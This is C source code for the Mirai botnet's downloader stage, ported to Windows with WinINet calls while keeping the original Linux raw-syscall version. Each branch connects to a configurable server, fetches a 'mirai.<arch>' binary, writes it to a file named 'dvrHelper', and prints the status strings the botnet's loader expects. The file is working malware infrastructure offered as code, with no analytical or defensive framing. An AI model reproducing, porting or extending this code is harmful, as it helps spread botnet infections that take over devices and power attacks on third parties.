/*
 * Windows-compatible DLR (Downloader) component
 * Replaces direct syscalls with Windows API calls
 */

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

// Windows-specific constants
#define WIN_BUFFER_SIZE 8192
#define WIN_HTTP_TIMEOUT 30000

#else
// Original Unix/Linux includes
#include <sys/types.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#endif

#define HTTP_SERVER_IP "127.0.0.1"  // Configurable server IP
#define HTTP_SERVER_PORT 80

#define EXEC_MSG            "MIRAI\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "FIN\n"
#define DOWNLOAD_MSG_LEN    4

#define STDIN   0
#define STDOUT  1
#define STDERR  2

// BOT_ARCH will be defined at compile time
#ifndef BOT_ARCH
#ifdef _WIN32
#ifdef _WIN64
#define BOT_ARCH "x64"
#else
#define BOT_ARCH "x86"
#endif
#else
#define BOT_ARCH "unknown"
#endif
#endif

#ifdef _WIN32

// Windows implementation
int win_write_stdout(const char *msg, int len)
{
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written;
    if (WriteFile(hStdOut, msg, len, &written, NULL))
        return written;
    return -1;
}

int win_download_file(void)
{
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    char url_path[256];
    char buffer[WIN_BUFFER_SIZE];
    DWORD bytes_read, bytes_written;
    int result = 0;
    
    // Build URL path
    snprintf(url_path, sizeof(url_path), "/bins/mirai.%s", BOT_ARCH);
    
    // Initialize WinINet
    hInternet = InternetOpenA("DLR/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet)
    {
        result = 1;
        goto cleanup;
    }
    
    // Connect to server
    hConnect = InternetConnectA(hInternet, HTTP_SERVER_IP, HTTP_SERVER_PORT, 
                               NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
    {
        result = 2;
        goto cleanup;
    }
    
    // Open request
    hRequest = HttpOpenRequestA(hConnect, "GET", url_path, "HTTP/1.0", 
                               NULL, NULL, 0, 0);
    if (!hRequest)
    {
        result = 3;
        goto cleanup;
    }
    
    // Send request
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0))
    {
        result = 4;
        goto cleanup;
    }
    
    // Create/open output file
    hFile = CreateFileA("dvrHelper", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        result = 5;
        goto cleanup;
    }
    
    // Download and write data
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0)
    {
        if (!WriteFile(hFile, buffer, bytes_read, &bytes_written, NULL) || 
            bytes_written != bytes_read)
        {
            result = 6;
            goto cleanup;
        }
    }

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    
    return result;
}

void win_main(void)
{
    int result;
    
    // Write execution message
    win_write_stdout(EXEC_MSG, EXEC_MSG_LEN);
    
    // Download file
    result = win_download_file();
    
    if (result == 0)
    {
        // Success - write completion message
        win_write_stdout(DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
        ExitProcess(5);  // Match original exit code
    }
    else
    {
        // Failure
        win_write_stdout("NIF\n", 4);
        ExitProcess(result);
    }
}

#else

// Original Unix/Linux implementation with syscalls
#if BYTE_ORDER == BIG_ENDIAN
#define HTONS(n) (n)
#define HTONL(n) (n)
#elif BYTE_ORDER == LITTLE_ENDIAN
#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | \
                  ((((unsigned long)(n) & 0xff00)) << 8) | \
                  ((((unsigned long)(n) & 0xff0000)) >> 8) | \
                  ((((unsigned long)(n) & 0xff000000)) >> 24))
#else
#error "Fix byteorder"
#endif

#ifdef __ARM_EABI__
#define SCN(n) ((n) & 0xfffff)
#else
#define SCN(n) (n)
#endif

// Function prototypes
inline void run(void);
int sstrlen(char *);
unsigned int utils_inet_addr(unsigned char, unsigned char, unsigned char, unsigned char);

// Syscall wrappers
int xsocket(int, int, int);
int xwrite(int, void *, int);
int xread(int, void *, int);
int xconnect(int, struct sockaddr_in *, int);
int xopen(char *, int, int);
int xclose(int);
void x__exit(int);

#define socket xsocket
#define write xwrite
#define read xread
#define connect xconnect
#define open xopen
#define close xclose
#define __exit x__exit

void __start(void)
{ 
#if defined(MIPS) || defined(MIPSEL)
    __asm(
        ".set noreorder\n"
        "move $0, $31\n"
        "bal 10f\n"
        "nop\n"
        "10:\n.cpload $31\n"
        "move $31, $0\n"
        ".set reorder\n"
    );
#endif
    run();
}

inline void run(void)
{
    char recvbuf[128];
    struct sockaddr_in addr;
    int sfd, ffd, ret;
    unsigned int header_parser = 0;
    int arch_strlen = sstrlen(BOT_ARCH);

    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);

    addr.sin_family = AF_INET;
    addr.sin_port = HTONS(80);
    addr.sin_addr.s_addr = utils_inet_addr(127,0,0,1);

    ffd = open("dvrHelper", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    sfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sfd == -1 || ffd == -1)
        __exit(1);

    if ((ret = connect(sfd, &addr, sizeof (struct sockaddr_in))) < 0)
    {
        write(STDOUT, "NIF\n", 4);
        __exit(-ret);
    }

    if (write(sfd, "GET /bins/mirai." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
    {
        __exit(3);
    }

    // Parse HTTP headers
    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(sfd, &ch, 1);

        if (ret != 1)
            __exit(4);
        header_parser = (header_parser << 8) | ch;
    }

    // Download file content
    while (1)
    {
        int ret = read(sfd, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;
        write(ffd, recvbuf, ret);
    }

    close(sfd);
    close(ffd);
    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
    __exit(5);
}

int sstrlen(char *str)
{
    int c = 0;
    while (*str++ != 0)
        c++;
    return c;
}

unsigned int utils_inet_addr(unsigned char one, unsigned char two, unsigned char three, unsigned char four)
{
    unsigned long ip = 0;
    ip |= (one << 24);
    ip |= (two << 16);
    ip |= (three << 8);
    ip |= (four << 0);
    return HTONL(ip);
}

int xsocket(int domain, int type, int protocol)
{
#if defined(__NR_socketcall)
    struct {
        int domain, type, protocol;
    } socketcall;
    socketcall.domain = domain;
    socketcall.type = type;
    socketcall.protocol = protocol;
    return syscall(SCN(SYS_socketcall), 1, &socketcall);
#else
    return syscall(SCN(SYS_socket), domain, type, protocol);
#endif
}

int xread(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_read), fd, buf, len);
}

int xwrite(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_write), fd, buf, len);
}

int xconnect(int fd, struct sockaddr_in *addr, int len)
{
#if defined(__NR_socketcall)
    struct {
        int fd;
        struct sockaddr_in *addr;
        int len;
    } socketcall;
    socketcall.fd = fd;
    socketcall.addr = addr;
    socketcall.len = len;
    return syscall(SCN(SYS_socketcall), 3, &socketcall);
#else
    return syscall(SCN(SYS_connect), fd, addr, len);
#endif
}

int xopen(char *path, int flags, int other)
{
    return syscall(SCN(SYS_open), path, flags, other);
}

int xclose(int fd)
{
    return syscall(SCN(SYS_close), fd);
}

void x__exit(int code)
{
    syscall(SCN(SYS_exit), code);
}

#endif // _WIN32

// Main entry point
#ifdef _WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    win_main();
    return 0;
}

int main()
{
    win_main();
    return 0;
}
#else
void __start(void);
#endif